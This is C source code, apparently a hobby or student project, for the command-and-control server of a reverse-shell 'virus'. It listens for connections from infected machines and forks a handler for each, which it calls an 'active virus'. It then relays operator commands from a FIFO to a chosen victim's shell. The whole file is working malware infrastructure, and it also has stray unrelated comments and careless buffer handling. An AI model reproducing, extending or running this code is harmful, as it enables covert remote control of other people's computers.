#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//socket stuff
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

//signal stuff
#include <signal.h>

//reap children
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "utils.h"
#include "server.h"
#include "networking.h"
#include "control_server.h"
#include "user_console.h"
#include <fcntl.h>
#define SIZE 100

static int childFds[SIZE];
static int idCount = 0;
char * server_name = LISTENING_SERVER;
static int user_read;

void sighandler(int signo){
  switch(signo){
    case SIGCHLD:
      {
        //reap all available children but don't block
        while(waitpid(-1,NULL,WNOHANG) > 0);
        break;
      }
    case SIGUSR1:
      {
        recv_user_cmd();
        break;
      }
    case SIGUSR2:
      {
        printf("CHECKING IN.... My Pid is %d \nim a %s\n", getpid(), server_name);
        break;
      }
    case SIGPIPE:
      {
        printf("SIGPIPE from using bad user number...\n");
      }
  }

}


int recv_user_cmd(){
  int shellid;
  int msg_ln;//www.nytimes.com

  char cmd[1024] = "";
  read(user_read, &shellid, sizeof(shellid));
  read(user_read, &msg_ln, sizeof(msg_ln));
  read(user_read, cmd, msg_ln);
  if(shellid >= idCount){
    printf("ERR: %d is not a valid child...\n", shellid);
  }//www.nytimes.com

  else{
      // strcpy(cmd, special_cmd(cmd));
      // msg_ln = strlen(cmd) +1;
      printf("%d %s\n\n", shellid, cmd);
    write(childFds[shellid], cmd, msg_ln);
  }
}


int main(int argc, char const* argv[]){
    signal(SIGCHLD, sighandler); //set SIGCHILD to reaper...
    signal(SIGUSR1, sighandler);
    signal(SIGUSR2, sighandler);
    signal(SIGPIPE, sighandler);

    mkfifo(FIFO_NAME, 0777);


    printf("welcome to the reverse shell attack server handling all communications with the virus. To control the server, connect through a different terminal by typing in \n\n./user_shell %d\n\n\n", getpid());
    user_read = open(FIFO_NAME, O_RDONLY, 0);

    //set up server listening ...
    int server_fd = setup_server();


    childFds[SIZE - 1] = 0;

    //server loop
    while(1){
        //main server loop

        int new_socket = accept(server_fd, NULL,NULL); //block until a client tries to connect

        int fds[2];
        pipe(fds);
        if(fork()==0){//if fork is child
            // do what the server should do
	          close(fds[1]);
            listening_server_action(new_socket, fds[0]);

            //clean up
            close(new_socket);
            printf("closing connection to user...\n");
            printf("DO NOT USE %d\n", idCount);
            exit(0);
        }

        //if we are not the subserver, close the socket to the client
        close(fds[0]);
        printf("Added virus %d to list of active viruses. You can access it at %d\n", idCount, idCount);
        childFds[idCount] = fds[1];
        idCount++;
        close(new_socket);
  }

  return 0;
}
